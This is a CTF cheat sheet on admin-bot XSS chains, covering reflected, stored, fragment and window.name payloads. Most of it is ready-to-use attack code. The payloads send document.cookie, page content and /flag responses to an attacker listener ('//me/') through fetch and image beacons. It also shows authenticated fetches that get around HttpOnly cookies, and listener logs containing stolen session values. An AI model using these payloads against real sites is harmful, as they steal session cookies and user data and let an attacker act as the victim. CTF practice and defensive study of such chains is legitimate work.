# Bot chains — admin-bot XSS workflows end-to-end

The admin-bot is the standard CTF trigger: a headless browser that
visits a URL you supply, carrying the flag (in a cookie, in the
page, or in a flag-only endpoint). Your XSS runs in their session.

---

## 1. The bot contract — what you control

```text
you submit a URL → the bot visits it (usually headless Chrome)
   the bot's session: often logged-in-admin or carries the flag cookie
   your URL: must be same-origin or reachable by the bot
   the bot does NOT hover, click, or interact (usually) —
   autofire payloads only
```

The bot visits YOUR page or a TARGET page — pick by where your
payload lives:

```text
bot visits target.com/page?x=<payload>     → reflected XSS
bot visits target.com/your-post            → stored XSS on your post
bot visits your-server.com/x.html          → your page → opener paths
bot visits a page you control the URL of   → fragment-carried XSS
```

---

## 2. The flag-location cases — where the flag lives

```text
a) the flag IS the bot's cookie            → exfil document.cookie
b) the flag is on a page the bot renders    → read DOM of that page
c) the flag is on a /flag endpoint          → fetch('/flag') same-origin
d) the flag is on a page the bot visits    → embed that page and read
e) the flag is behind an action            → perform the action as bot
```

Each case wants a different payload — don't just steal cookies when
the flag is in the DOM.

---

## 3. The "your page" chain — maximal control

When the bot visits a URL you supply directly (not target-page):

```html
<!-- your page at //me/x.html -->
<script>
  // case a: flag in cookie — but cookies are origin-scoped!
  // your page can't read target.com cookies
  // → you need to embed the target and read ITS DOM/cookies
  var w = window.open('https://target.com/flag-page');
  w.onload = () => {
    var flag = w.document.body.innerText;
    fetch('/collect?f='+encodeURIComponent(flag));
  };
  // SOP blocks this — w.document is cross-origin → DEAD unless
  // the target is iframe-able AND same-origin (it isn't)
</script>
```

The SOP problem: your page can iframe target.com but CANNOT read
its DOM (cross-origin). The fix — a chain:

```html
<!-- your page embeds target → target's stored XSS fires →
     the XSS runs in TARGET's origin → reads target's DOM/cookies -->
<iframe src="https://target.com/your-post-with-stored-xss"></iframe>
   -- the stored XSS exfils to your listener directly
```

So "your page" doesn't help unless the target's XSS does the work
inside its own origin. The bot-visits-your-page route matters when
the target IS your page (self-XSS pivot) — `postmessage.md` §10.

---

## 4. The reflected-XSS chain — payload in the bot's URL

```text
1. your payload: ?x=<img src=x onerror="fetch('//me/?c='+document.cookie)">
2. submit the crafted URL to the bot
3. bot visits → reflection → your JS runs in target origin
4. exfil
```

The URL carries everything — you get ONE shot at the payload.

```html
<!-- the crafted URL: -->
https://target.com/search?q=%3Cimg%20src%3Dx%20onerror%3D
  %22fetch(%27%2F%2Fme%2F%3Fc%3D%27%2Bdocument.cookie)%22%3E
```

URL-encode the whole payload — `#` inside a URL truncates at the
fragment; `&` splits params; encode both.

---

## 5. The stored-XSS chain — plant then trigger

```text
1. POST your payload into a stored field (comment/username/bio)
2. submit the field's RENDER PAGE url to the bot
3. bot loads the page → stored payload fires in their session
4. exfil
```

The plant and the trigger are separate steps — the stored field
renders on the page the bot visits.

---

## 6. The fragment-carrier — payload in `#`

```javascript
// the bot-url carries the code AFTER #:
https://target.com/page#alert(document.cookie)
// your stored piece on target.com is just:
<img src=x onerror="eval(location.hash.slice(1))">
```

The stored piece is tiny and survives filtering; the real payload
is in the URL's fragment — never sent to the server, only read by
JS. Useful when the stored field is aggressively filtered.

window.name carrier — when you control the opener:

```javascript
// your page:
window.name = 'alert(document.cookie)';
location = 'https://target.com/page-with-eval-name';
// target: eval(name) — window.name survives the navigation
```

---

## 7. The flag-reading chains — per flag-location

```javascript
// flag in DOM of the page the bot renders:
<img src=x onerror="
  new Image().src='//me/?f='+encodeURIComponent(
    document.getElementById('flag').textContent)">

// flag on /flag endpoint (same origin):
<img src=x onerror="
  fetch('/flag').then(r=>r.text()).then(t=>
    new Image().src='//me/?f='+encodeURIComponent(t))">

// flag needs an action (click "show flag"):
<img src=x onerror="
  document.getElementById('show').click();
  setTimeout(()=>new Image().src='//me/?f='+
    encodeURIComponent(document.getElementById('flag').innerText),500)">

// flag in a different page (iframe it and read — same origin):
<iframe src="/flag" onload="
  new Image().src='//me/?f='+encodeURIComponent(
    this.contentDocument.body.innerText)">
</iframe>
```

The iframe-read trick: same-origin iframe's `contentDocument` is
readable — the standard way to pull a second page's content into
your exfil.

---

## 8. HttpOnly cookies — steal the ACTION, not the cookie

```javascript
// cookie HttpOnly → document.cookie is empty → perform actions:
<img src=x onerror="
  fetch('/api/flag',{credentials:'include'})
    .then(r=>r.text())
    .then(t=>fetch('//me/?f='+encodeURIComponent(t)))
">
   -- the fetch carries the victim's cookies automatically —
      the COOKIE stays hidden but the ACTION is authenticated
```

---

## 9. The listener side — what "success" looks like

```bash
# your listener sees:
GET /?c=session%3Dabc123%3B%20flag%3Dflag%7B...%7D HTTP/1.1
   -- the cookie+flag arrived — the full chain worked

GET /?f=flag%7Bxxx%7D HTTP/1.1
   -- the /flag fetch carried it out
```

No listener hit after the bot's cycle → the payload never ran —
diagnose: filtered? context? autofire?

---

## 10. The CTF bot quirks — common gotchas

```text
- bots often run headless Chrome — some handlers don't fire:
  onfocus needs a focusable element + autofocus
  onmouseover needs hover (never happens)
  onstart on marquee — works headless
- bots usually have a SHORT time budget — payload must fire fast
- bots may visit http://localhost:PORT — your exfil must be
  reachable from inside the bot's network (Docker-internal vs public)
- the bot may strip your URL's params — keep the payload in path or
  fragment if query gets normalized
- report endpoints often validate the URL is on-domain — host your
  redirect on the same domain (a stored-XSS'd page works)
```

---

## 11. The protocol summary

```text
1. find where the flag lives (cookie/dom/endpoint/action)
2. find where your payload can land (reflected param / stored field)
3. pick the channel (exfil-methods.md — img beacon is the default)
4. build the payload for the flag-location case
5. submit the trigger URL to the bot
6. listener hit → flag; no hit → filter-diagnose → variant
```
